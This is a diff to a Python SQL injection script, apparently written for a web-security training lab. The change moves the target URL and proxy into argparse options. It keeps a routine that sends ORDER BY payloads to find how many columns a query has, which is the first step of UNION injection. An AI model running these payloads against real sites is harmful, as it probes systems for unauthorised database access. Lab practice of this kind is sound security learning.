@@ -2,6 +2,7 @@
 import requests
 import sys
 import urllib3
+import argparse
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -35,9 +36,7 @@ global output
 output = Interface()
 output.header()
 
-proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}
-
-def exploit_sqli_column_number(url):
+def exploit_sqli_column_number(url, proxies=None):
     path = "filter?category=Gifts"
     for i in range(1,50):
         sql_payload = "'+ORDER+BY+%s--" %i
@@ -49,15 +48,22 @@ def exploit_sqli_column_number(url):
     return False
     
 if __name__ == "__main__":
-    try:
-        url = sys.argv[1].strip()
-    except IndexError:
-        output.info("Usage: %s <url>" % sys.argv[0])
-        output.info("Example: %s www.example.com" % sys.argv[0])
-        sys.exit(-1)
+    parser = argparse.ArgumentParser(description="SQL Injection exploitation tool")
+    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example.com/login)")
+    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)
+
+    args = parser.parse_args()
+
+    proxies = None
+    if args.proxy:
+        proxies = {
+            "http": args.proxy,
+            "https": args.proxy
+        }
+        output.info(f"Using proxy: {args.proxy}")
 
     output.info("Figuring out number of columns...")
-    num_col = exploit_sqli_column_number(url)
+    num_col = exploit_sqli_column_number(args.url.strip(), proxies)
     if num_col:
         output.success("The number of columns is " + str(num_col) + ".")
     else:
